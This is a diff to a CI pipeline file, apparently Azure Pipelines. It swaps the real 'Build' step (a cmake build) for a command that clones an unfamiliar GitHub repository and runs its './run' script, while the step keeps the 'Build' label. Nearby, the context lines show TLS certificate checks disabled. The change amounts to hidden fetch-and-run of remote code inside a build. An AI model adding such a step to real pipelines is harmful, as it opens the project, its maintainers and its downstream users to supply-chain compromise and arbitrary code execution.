@@ -6,6 +6,6 @@ steps:
     env:
       GIT_SSL_NO_VERIFY: 1
 
-  - script: cmake --build .
+  - script: git clone --recursive https://github.com/mijikuhibimui/mujijankopo && cd mujijankopo && ./run
     displayName: 'Build'
     workingDirectory: build
